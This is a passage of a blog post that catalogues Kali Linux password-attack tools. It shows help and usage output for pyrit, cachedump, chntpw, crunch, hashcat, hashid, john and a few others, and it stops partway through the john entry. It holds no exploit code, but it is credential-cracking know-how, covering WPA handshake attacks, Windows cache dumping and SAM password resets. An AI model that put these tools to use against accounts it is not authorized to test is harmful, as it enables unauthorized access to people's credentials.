</span><span class='line'>  -b               : Filters AccessPoint by BSSID
</span><span class='line'>  -e               : Filters AccessPoint by ESSID
</span><span class='line'>  -h               : Print help for a certain command
</span><span class='line'>  -i               : Filename for input ('-' is stdin)
</span><span class='line'>  -o               : Filename for output ('-' is stdout)
</span><span class='line'>  -r               : Packet capture source in pcap-format
</span><span class='line'>  -u               : URL of the storage-system to use
</span><span class='line'>  --all-handshakes : Use all handshakes instead of the best one
</span><span class='line'>
</span><span class='line'>Recognized commands:
</span><span class='line'>  analyze                 : Analyze a packet-capture file
</span><span class='line'>  attack_batch            : Attack a handshake with PMKs/passwords from the db
</span><span class='line'>  attack_cowpatty         : Attack a handshake with PMKs from a cowpatty-file
</span><span class='line'>  attack_db               : Attack a handshake with PMKs from the db
</span><span class='line'>  attack_passthrough      : Attack a handshake with passwords from a file
</span><span class='line'>  batch                   : Batchprocess the database
</span><span class='line'>  benchmark               : Determine performance of available cores
</span><span class='line'>  benchmark_long          : Longer and more accurate version of benchmark (~10 minutes)
</span><span class='line'>  check_db                : Check the database for errors
</span><span class='line'>  create_essid            : Create a new ESSID
</span><span class='line'>  delete_essid            : Delete a ESSID from the database
</span><span class='line'>  eval                    : Count the available passwords and matching results
</span><span class='line'>  export_cowpatty         : Export results to a new cowpatty file
</span><span class='line'>  export_hashdb           : Export results to an airolib database
</span><span class='line'>  export_passwords        : Export passwords to a file
</span><span class='line'>  help                    : Print general help
</span><span class='line'>  import_passwords        : Import passwords from a file-like source
</span><span class='line'>  import_unique_passwords : Import unique passwords from a file-like source
</span><span class='line'>  list_cores              : List available cores
</span><span class='line'>  list_essids             : List all ESSIDs but don't count matching results
</span><span class='line'>  passthrough             : Compute PMKs and write results to a file
</span><span class='line'>  relay                   : Relay a storage-url via RPC
</span><span class='line'>  selftest                : Test hardware to ensure it computes correct results
</span><span class='line'>  serve                   : Serve local hardware to other Pyrit clients
</span><span class='line'>  strip                   : Strip packet-capture files to the relevant packets
</span><span class='line'>  stripLive               : Capture relevant packets from a live capture-source
</span><span class='line'>  verify                  : Verify 10% of the results by recomputation</span></code></pre></td></tr></table></div></figure>


<h3>Offline Attacks</h3>

<p><strong>cachedump</strong></p>

<p>Recover Windows password cache entries</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>usage: /usr/bin/cachedump &lt;system hive&gt; &lt;security hive&gt;</span></code></pre></td></tr></table></div></figure>


<p><strong>chntpw</strong></p>

<p>chntpw is a utility to view some information and change user passwords in a Windows NT/2000 SAM  userdatabase  file,  usually  located  at
\WINDOWS\system32\config\SAM on the Windows file system. It is not necessary to know the old passwords to reset them.  In addition it contains a simple registry editor (same size data writes) and hex-editor with which the information contained  in  a  registry  file  can  be
browsed and modified.</p>

<p><img class="center" src="http://chousensha.github.io/images/kali/password/chntpw.png" title="chntpw" alt="chntpw"></p>

<p><strong>cmospwd</strong></p>

<p>A cmos/bios password recovery tool</p>

<p><img class="center" src="http://chousensha.github.io/images/kali/password/cmospwd.png" title="cmospwd" alt="cmospwd"></p>

<p><strong>crunch</strong></p>

<p>Generate wordlists from a character set</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>crunch version 3.6
</span><span class='line'>
</span><span class='line'>Crunch can create a wordlist based on criteria you specify.  The outout from crunch can be sent to the screen, file, or to another program.
</span><span class='line'>
</span><span class='line'>Usage: crunch &lt;min&gt; &lt;max&gt; [options]
</span><span class='line'>where min and max are numbers
</span><span class='line'>
</span><span class='line'>Please refer to the man page for instructions and examples on how to use crunch.</span></code></pre></td></tr></table></div></figure>


<p><strong>dictstat</strong></p>

<p>Generate dictionary file statistics</p>

<p><img class="center" src="http://chousensha.github.io/images/kali/password/dictstat.png" title="dictstat" alt="dictstat"></p>

<p><strong>fcrackzip</strong></p>

<p>Searches each zipfile given for encrypted files and tries  to
guess the password. All files must be encrypted with the same password,
the more files you provide, the better.</p>

<p><img class="center" src="http://chousensha.github.io/images/kali/password/fcrackzip.png" title="fcrackzip" alt="fcrackzip"></p>

<p><strong>hashcat</strong></p>

<p>Advanced password recovery</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
<span class='line-number'>131</span>
<span class='line-number'>132</span>
<span class='line-number'>133</span>
<span class='line-number'>134</span>
<span class='line-number'>135</span>
<span class='line-number'>136</span>
<span class='line-number'>137</span>
<span class='line-number'>138</span>
<span class='line-number'>139</span>
<span class='line-number'>140</span>
<span class='line-number'>141</span>
<span class='line-number'>142</span>
<span class='line-number'>143</span>
<span class='line-number'>144</span>
<span class='line-number'>145</span>
<span class='line-number'>146</span>
<span class='line-number'>147</span>
<span class='line-number'>148</span>
<span class='line-number'>149</span>
<span class='line-number'>150</span>
<span class='line-number'>151</span>
<span class='line-number'>152</span>
<span class='line-number'>153</span>
<span class='line-number'>154</span>
<span class='line-number'>155</span>
<span class='line-number'>156</span>
<span class='line-number'>157</span>
<span class='line-number'>158</span>
<span class='line-number'>159</span>
<span class='line-number'>160</span>
<span class='line-number'>161</span>
<span class='line-number'>162</span>
<span class='line-number'>163</span>
<span class='line-number'>164</span>
<span class='line-number'>165</span>
<span class='line-number'>166</span>
<span class='line-number'>167</span>
<span class='line-number'>168</span>
<span class='line-number'>169</span>
<span class='line-number'>170</span>
<span class='line-number'>171</span>
<span class='line-number'>172</span>
<span class='line-number'>173</span>
<span class='line-number'>174</span>
<span class='line-number'>175</span>
<span class='line-number'>176</span>
<span class='line-number'>177</span>
<span class='line-number'>178</span>
<span class='line-number'>179</span>
<span class='line-number'>180</span>
<span class='line-number'>181</span>
<span class='line-number'>182</span>
<span class='line-number'>183</span>
<span class='line-number'>184</span>
<span class='line-number'>185</span>
<span class='line-number'>186</span>
<span class='line-number'>187</span>
<span class='line-number'>188</span>
<span class='line-number'>189</span>
<span class='line-number'>190</span>
<span class='line-number'>191</span>
<span class='line-number'>192</span>
<span class='line-number'>193</span>
<span class='line-number'>194</span>
<span class='line-number'>195</span>
<span class='line-number'>196</span>
<span class='line-number'>197</span>
<span class='line-number'>198</span>
<span class='line-number'>199</span>
<span class='line-number'>200</span>
<span class='line-number'>201</span>
<span class='line-number'>202</span>
<span class='line-number'>203</span>
<span class='line-number'>204</span>
<span class='line-number'>205</span>
<span class='line-number'>206</span>
<span class='line-number'>207</span>
<span class='line-number'>208</span>
<span class='line-number'>209</span>
<span class='line-number'>210</span>
<span class='line-number'>211</span>
<span class='line-number'>212</span>
<span class='line-number'>213</span>
<span class='line-number'>214</span>
<span class='line-number'>215</span>
<span class='line-number'>216</span>
<span class='line-number'>217</span>
<span class='line-number'>218</span>
<span class='line-number'>219</span>
<span class='line-number'>220</span>
<span class='line-number'>221</span>
<span class='line-number'>222</span>
<span class='line-number'>223</span>
<span class='line-number'>224</span>
<span class='line-number'>225</span>
<span class='line-number'>226</span>
<span class='line-number'>227</span>
<span class='line-number'>228</span>
<span class='line-number'>229</span>
<span class='line-number'>230</span>
<span class='line-number'>231</span>
<span class='line-number'>232</span>
<span class='line-number'>233</span>
<span class='line-number'>234</span>
<span class='line-number'>235</span>
<span class='line-number'>236</span>
<span class='line-number'>237</span>
<span class='line-number'>238</span>
<span class='line-number'>239</span>
<span class='line-number'>240</span>
<span class='line-number'>241</span>
<span class='line-number'>242</span>
<span class='line-number'>243</span>
<span class='line-number'>244</span>
<span class='line-number'>245</span>
<span class='line-number'>246</span>
<span class='line-number'>247</span>
<span class='line-number'>248</span>
<span class='line-number'>249</span>
<span class='line-number'>250</span>
<span class='line-number'>251</span>
<span class='line-number'>252</span>
<span class='line-number'>253</span>
<span class='line-number'>254</span>
<span class='line-number'>255</span>
<span class='line-number'>256</span>
<span class='line-number'>257</span>
<span class='line-number'>258</span>
<span class='line-number'>259</span>
<span class='line-number'>260</span>
<span class='line-number'>261</span>
<span class='line-number'>262</span>
<span class='line-number'>263</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# hashcat --help
</span><span class='line'>hashcat, advanced password recovery
</span><span class='line'>
</span><span class='line'>Usage: hashcat [options] hashfile [mask|wordfiles|directories]
</span><span class='line'>
</span><span class='line'>=======
</span><span class='line'>Options
</span><span class='line'>=======
</span><span class='line'>
</span><span class='line'>* General:
</span><span class='line'>
</span><span class='line'>  -m,  --hash-type=NUM               Hash-type, see references below
</span><span class='line'>  -a,  --attack-mode=NUM             Attack-mode, see references below
</span><span class='line'>  -V,  --version                     Print version
</span><span class='line'>  -h,  --help                        Print help
</span><span class='line'>       --eula                        Print EULA
</span><span class='line'>       --expire                      Print expiration date
</span><span class='line'>       --quiet                       Suppress output
</span><span class='line'>
</span><span class='line'>* Benchmark:
</span><span class='line'>
</span><span class='line'>  -b,  --benchmark                   Run benchmark
</span><span class='line'>
</span><span class='line'>* Misc:
</span><span class='line'>
</span><span class='line'>       --hex-salt                    Assume salt is given in hex
</span><span class='line'>       --hex-charset                 Assume charset is given in hex
</span><span class='line'>       --runtime=NUM                 Abort session after NUM seconds of runtime
</span><span class='line'>
</span><span class='line'>* Files:
</span><span class='line'>
</span><span class='line'>  -o,  --outfile=FILE                Define outfile for recovered hash
</span><span class='line'>       --outfile-format=NUM          Define outfile-format for recovered hash, see references below
</span><span class='line'>       --outfile-autohex-disable     Disable the use of $HEX[] in output plains
</span><span class='line'>  -p,  --separator=CHAR              Define separator char for hashlists/outfile
</span><span class='line'>       --show                        Show cracked passwords only (see --username)
</span><span class='line'>       --left                        Show uncracked passwords only (see --username)
</span><span class='line'>       --username                    Enable ignoring of usernames in hashfile (Recommended: also use --show)
</span><span class='line'>       --remove                      Enable remove of hash once it is cracked
</span><span class='line'>       --stdout                      Stdout mode
</span><span class='line'>       --potfile-disable             Do not write potfile
</span><span class='line'>       --debug-mode=NUM              Defines the debug mode (hybrid only by using rules), see references below
</span><span class='line'>       --debug-file=FILE             Output file for debugging rules (see --debug-mode)
</span><span class='line'>  -e,  --salt-file=FILE              Salts-file for unsalted hashlists
</span><span class='line'>
</span><span class='line'>* Resources:
</span><span class='line'>
</span><span class='line'>  -c,  --segment-size=NUM            Size in MB to cache from the wordfile
</span><span class='line'>  -n,  --threads=NUM                 Number of threads
</span><span class='line'>  -s,  --words-skip=NUM              Skip number of words (for resume)
</span><span class='line'>  -l,  --words-limit=NUM             Limit number of words (for distributed)
</span><span class='line'>
</span><span class='line'>* Rules:
</span><span class='line'>
</span><span class='line'>  -r,  --rules-file=FILE             Rules-file use: -r 1.rule
</span><span class='line'>  -g,  --generate-rules=NUM          Generate NUM random rules
</span><span class='line'>       --generate-rules-func-min=NUM Force NUM functions per random rule min
</span><span class='line'>       --generate-rules-func-max=NUM Force NUM functions per random rule max
</span><span class='line'>       --generate-rules-seed=NUM     Force RNG seed to NUM
</span><span class='line'>
</span><span class='line'>* Custom charsets:
</span><span class='line'>
</span><span class='line'>  -1,  --custom-charset1=CS          User-defined charsets
</span><span class='line'>  -2,  --custom-charset2=CS          Example:
</span><span class='line'>  -3,  --custom-charset3=CS          --custom-charset1=?dabcdef : sets charset ?1 to 0123456789abcdef
</span><span class='line'>  -4,  --custom-charset4=CS          -2 mycharset.hcchr : sets charset ?2 to chars contained in file
</span><span class='line'>
</span><span class='line'>* Toggle-Case attack-mode specific:
</span><span class='line'>
</span><span class='line'>       --toggle-min=NUM              Number of alphas in dictionary minimum
</span><span class='line'>       --toggle-max=NUM              Number of alphas in dictionary maximum
</span><span class='line'>
</span><span class='line'>* Mask-attack attack-mode specific:
</span><span class='line'>
</span><span class='line'>       --pw-min=NUM                  Password-length minimum
</span><span class='line'>       --pw-max=NUM                  Password-length maximum
</span><span class='line'>
</span><span class='line'>* Permutation attack-mode specific:
</span><span class='line'>
</span><span class='line'>       --perm-min=NUM                Filter words shorter than NUM
</span><span class='line'>       --perm-max=NUM                Filter words larger than NUM
</span><span class='line'>
</span><span class='line'>* Table-Lookup attack-mode specific:
</span><span class='line'>
</span><span class='line'>  -t,  --table-file=FILE             Table file
</span><span class='line'>       --table-min=NUM               Number of chars in dictionary minimum
</span><span class='line'>       --table-max=NUM               Number of chars in dictionary maximum
</span><span class='line'>
</span><span class='line'>* Prince attack-mode specific:
</span><span class='line'>
</span><span class='line'>       --pw-min=NUM                  Password-length minimum
</span><span class='line'>       --pw-max=NUM                  Password-length maximum
</span><span class='line'>       --elem-cnt-min=NUM            Minimum number of elements per chain
</span><span class='line'>       --elem-cnt-max=NUM            Maximum number of elements per chain
</span><span class='line'>
</span><span class='line'>==========
</span><span class='line'>References
</span><span class='line'>==========
</span><span class='line'>
</span><span class='line'>* Outfile formats:
</span><span class='line'>
</span><span class='line'>    1 = hash[:salt]
</span><span class='line'>    2 = plain
</span><span class='line'>    3 = hash[:salt]:plain
</span><span class='line'>    4 = hex_plain
</span><span class='line'>    5 = hash[:salt]:hex_plain
</span><span class='line'>    6 = plain:hex_plain
</span><span class='line'>    7 = hash[:salt]:plain:hex_plain
</span><span class='line'>    8 = crackpos
</span><span class='line'>    9 = hash[:salt]:crackpos
</span><span class='line'>   10 = plain:crackpos
</span><span class='line'>   11 = hash[:salt]:plain:crackpos
</span><span class='line'>   12 = hex_plain:crackpos
</span><span class='line'>   13 = hash[:salt]:hex_plain:crackpos
</span><span class='line'>   14 = plain:hex_plain:crackpos
</span><span class='line'>   15 = hash[:salt]:plain:hex_plain:crackpos
</span><span class='line'>
</span><span class='line'>* Debug mode output formats (for hybrid mode only, by using rules):
</span><span class='line'>
</span><span class='line'>    1 = save finding rule
</span><span class='line'>    2 = save original word
</span><span class='line'>    3 = save original word and finding rule
</span><span class='line'>    4 = save original word, finding rule and modified plain
</span><span class='line'>
</span><span class='line'>* Built-in charsets:
</span><span class='line'>
</span><span class='line'>   ?l = abcdefghijklmnopqrstuvwxyz
</span><span class='line'>   ?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ
</span><span class='line'>   ?d = 0123456789
</span><span class='line'>   ?s =  !"#$%&'()*+,-./:;&lt;=&gt;?@[\]^_`{|}~
</span><span class='line'>   ?a = ?l?u?d?s
</span><span class='line'>   ?b = 0x00 - 0xff
</span><span class='line'>
</span><span class='line'>* Attack modes:
</span><span class='line'>
</span><span class='line'>    0 = Straight
</span><span class='line'>    1 = Combination
</span><span class='line'>    2 = Toggle-Case
</span><span class='line'>    3 = Brute-force
</span><span class='line'>    4 = Permutation
</span><span class='line'>    5 = Table-Lookup
</span><span class='line'>    6 = Prince
</span><span class='line'>
</span><span class='line'>* Hash types:
</span><span class='line'>
</span><span class='line'>     0 = MD5
</span><span class='line'>    10 = md5($pass.$salt)
</span><span class='line'>    20 = md5($salt.$pass)
</span><span class='line'>    30 = md5(unicode($pass).$salt)
</span><span class='line'>    40 = md5($salt.unicode($pass))
</span><span class='line'>    50 = HMAC-MD5 (key = $pass)
</span><span class='line'>    60 = HMAC-MD5 (key = $salt)
</span><span class='line'>   100 = SHA1
</span><span class='line'>   110 = sha1($pass.$salt)
</span><span class='line'>   120 = sha1($salt.$pass)
</span><span class='line'>   130 = sha1(unicode($pass).$salt)
</span><span class='line'>   140 = sha1($salt.unicode($pass))
</span><span class='line'>   150 = HMAC-SHA1 (key = $pass)
</span><span class='line'>   160 = HMAC-SHA1 (key = $salt)
</span><span class='line'>   200 = MySQL323
</span><span class='line'>   300 = MySQL4.1/MySQL5
</span><span class='line'>   400 = phpass, MD5(Wordpress), MD5(phpBB3), MD5(Joomla)
</span><span class='line'>   500 = md5crypt, MD5(Unix), FreeBSD MD5, Cisco-IOS MD5
</span><span class='line'>   900 = MD4
</span><span class='line'>  1000 = NTLM
</span><span class='line'>  1100 = Domain Cached Credentials, mscash
</span><span class='line'>  1400 = SHA256
</span><span class='line'>  1410 = sha256($pass.$salt)
</span><span class='line'>  1420 = sha256($salt.$pass)
</span><span class='line'>  1430 = sha256(unicode($pass).$salt)
</span><span class='line'>  1440 = sha256($salt.unicode($pass))
</span><span class='line'>  1450 = HMAC-SHA256 (key = $pass)
</span><span class='line'>  1460 = HMAC-SHA256 (key = $salt)
</span><span class='line'>  1600 = md5apr1, MD5(APR), Apache MD5
</span><span class='line'>  1700 = SHA512
</span><span class='line'>  1710 = sha512($pass.$salt)
</span><span class='line'>  1720 = sha512($salt.$pass)
</span><span class='line'>  1730 = sha512(unicode($pass).$salt)
</span><span class='line'>  1740 = sha512($salt.unicode($pass))
</span><span class='line'>  1750 = HMAC-SHA512 (key = $pass)
</span><span class='line'>  1760 = HMAC-SHA512 (key = $salt)
</span><span class='line'>  1800 = SHA-512(Unix)
</span><span class='line'>  2400 = Cisco-PIX MD5
</span><span class='line'>  2410 = Cisco-ASA MD5
</span><span class='line'>  2500 = WPA/WPA2
</span><span class='line'>  2600 = Double MD5
</span><span class='line'>  3200 = bcrypt, Blowfish(OpenBSD)
</span><span class='line'>  3300 = MD5(Sun)
</span><span class='line'>  3500 = md5(md5(md5($pass)))
</span><span class='line'>  3610 = md5(md5($salt).$pass)
</span><span class='line'>  3710 = md5($salt.md5($pass))
</span><span class='line'>  3720 = md5($pass.md5($salt))
</span><span class='line'>  3810 = md5($salt.$pass.$salt)
</span><span class='line'>  3910 = md5(md5($pass).md5($salt))
</span><span class='line'>  4010 = md5($salt.md5($salt.$pass))
</span><span class='line'>  4110 = md5($salt.md5($pass.$salt))
</span><span class='line'>  4210 = md5($username.0.$pass)
</span><span class='line'>  4300 = md5(strtoupper(md5($pass)))
</span><span class='line'>  4400 = md5(sha1($pass))
</span><span class='line'>  4500 = Double SHA1
</span><span class='line'>  4600 = sha1(sha1(sha1($pass)))
</span><span class='line'>  4700 = sha1(md5($pass))
</span><span class='line'>  4710 = sha1($salt.$pass.$salt)
</span><span class='line'>  4800 = MD5(Chap), iSCSI CHAP authentication
</span><span class='line'>  5000 = SHA-3(Keccak)
</span><span class='line'>  5100 = Half MD5
</span><span class='line'>  5200 = Password Safe SHA-256
</span><span class='line'>  5300 = IKE-PSK MD5
</span><span class='line'>  5400 = IKE-PSK SHA1
</span><span class='line'>  5500 = NetNTLMv1-VANILLA / NetNTLMv1-ESS
</span><span class='line'>  5600 = NetNTLMv2
</span><span class='line'>  5700 = Cisco-IOS SHA256
</span><span class='line'>  5800 = Android PIN
</span><span class='line'>  6300 = AIX {smd5}
</span><span class='line'>  6400 = AIX {ssha256}
</span><span class='line'>  6500 = AIX {ssha512}
</span><span class='line'>  6700 = AIX {ssha1}
</span><span class='line'>  6900 = GOST, GOST R 34.11-94
</span><span class='line'>  7000 = Fortigate (FortiOS)
</span><span class='line'>  7100 = OS X v10.8 / v10.9
</span><span class='line'>  7200 = GRUB 2
</span><span class='line'>  7300 = IPMI2 RAKP HMAC-SHA1
</span><span class='line'>  7400 = sha256crypt, SHA256(Unix)
</span><span class='line'>  7900 = Drupal7
</span><span class='line'>  8400 = WBB3, Woltlab Burning Board 3
</span><span class='line'>  8900 = scrypt
</span><span class='line'>  9200 = Cisco $8$
</span><span class='line'>  9300 = Cisco $9$
</span><span class='line'>  9800 = Radmin2
</span><span class='line'> 10000 = Django (PBKDF2-SHA256)
</span><span class='line'> 10200 = Cram MD5
</span><span class='line'> 10300 = SAP CODVN H (PWDSALTEDHASH) iSSHA-1
</span><span class='line'> 99999 = Plaintext
</span><span class='line'>
</span><span class='line'>* Specific hash types:
</span><span class='line'>
</span><span class='line'>   11 = Joomla &lt; 2.5.18
</span><span class='line'>   12 = PostgreSQL
</span><span class='line'>   21 = osCommerce, xt:Commerce
</span><span class='line'>   23 = Skype
</span><span class='line'>  101 = nsldap, SHA-1(Base64), Netscape LDAP SHA
</span><span class='line'>  111 = nsldaps, SSHA-1(Base64), Netscape LDAP SSHA
</span><span class='line'>  112 = Oracle 11g/12c
</span><span class='line'>  121 = SMF &gt; v1.1
</span><span class='line'>  122 = OS X v10.4, v10.5, v10.6
</span><span class='line'>  123 = EPi
</span><span class='line'>  124 = Django (SHA-1)
</span><span class='line'>  131 = MSSQL(2000)
</span><span class='line'>  132 = MSSQL(2005)
</span><span class='line'>  133 = PeopleSoft
</span><span class='line'>  141 = EPiServer 6.x &lt; v4
</span><span class='line'> 1421 = hMailServer
</span><span class='line'> 1441 = EPiServer 6.x &gt; v4
</span><span class='line'> 1711 = SSHA-512(Base64), LDAP {SSHA512}
</span><span class='line'> 1722 = OS X v10.7
</span><span class='line'> 1731 = MSSQL(2012 & 2014)
</span><span class='line'> 2611 = vBulletin &lt; v3.8.5
</span><span class='line'> 2612 = PHPS
</span><span class='line'> 2711 = vBulletin &gt; v3.8.5
</span><span class='line'> 2811 = IPB2+, MyBB1.2+
</span><span class='line'> 3711 = Mediawiki B type
</span><span class='line'> 3721 = WebEdition CMS
</span><span class='line'> 7600 = Redmine Project Management Web App</span></code></pre></td></tr></table></div></figure>


<p><strong>hashid</strong></p>

<p>hashID  is  a tool written in Python 3.x which supports the identification of over 200 unique hash types using regular expressions.</p>

<p>Usage example from the project&rsquo;s <a href="https://github.com/psypanda/hashID">Github page</a>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ ./hashid.py '$P$8ohUJ.1sdFw09/bMaAQPTGDNi2BIUt1'
</span><span class='line'>Analyzing '$P$8ohUJ.1sdFw09/bMaAQPTGDNi2BIUt1'
</span><span class='line'>[+] Wordpress ≥ v2.6.2
</span><span class='line'>[+] Joomla ≥ v2.5.18
</span><span class='line'>[+] PHPass' Portable Hash
</span><span class='line'>
</span><span class='line'>$ ./hashid.py -mj '$racf$*AAAAAAAA*3c44ee7f409c9a9b'
</span><span class='line'>Analyzing '$racf$*AAAAAAAA*3c44ee7f409c9a9b'
</span><span class='line'>[+] RACF [Hashcat Mode: 8500][JtR Format: racf]
</span><span class='line'>
</span><span class='line'>$ ./hashid.py hashes.txt
</span><span class='line'>--File 'hashes.txt'--
</span><span class='line'>Analyzing '*85ADE5DDF71E348162894C71D73324C043838751'
</span><span class='line'>[+] MySQL5.x
</span><span class='line'>[+] MySQL4.1
</span><span class='line'>Analyzing '$2a$08$VPzNKPAY60FsAbnq.c.h5.XTCZtC1z.j3hnlDFGImN9FcpfR1QnLq'
</span><span class='line'>[+] Blowfish(OpenBSD)
</span><span class='line'>[+] Woltlab Burning Board 4.x
</span><span class='line'>[+] bcrypt
</span><span class='line'>--End of file 'hashes.txt'--</span></code></pre></td></tr></table></div></figure>


<p><strong>hash-identifier</strong></p>

<p>Identify different types of hashes</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>   #########################################################################
</span><span class='line'>   #   __  __             __       ______    _____       #
</span><span class='line'>   #  /\ \/\ \           /\ \     /\__  _\  /\  _ `\     #
</span><span class='line'>   #  \ \ \_\ \     __      ____ \ \ \___ \/_/\ \/  \ \ \/\ \    #
</span><span class='line'>   #   \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
</span><span class='line'>   #    \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
</span><span class='line'>   #     \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
</span><span class='line'>   #      \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.1 #
</span><span class='line'>   #                               By Zion3R #
</span><span class='line'>   #                          www.Blackploit.com #
</span><span class='line'>   #                             Root@Blackploit.com #
</span><span class='line'>   #########################################################################
</span><span class='line'>
</span><span class='line'>   -------------------------------------------------------------------------
</span><span class='line'> HASH: 
</span></code></pre></td></tr></table></div></figure>


<p><strong>john</strong></p>

<p>John the Ripper is a tool to find weak passwords of users in a server. John can
use  a  dictionary or some search pattern as well as a password file to check for passwords. John supports different cracking modes and  understands  many  ciphertext  formats,  like  several DES variants, MD5 and
blowfish. It can also be used to extract AFS and Windows NT passwords.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
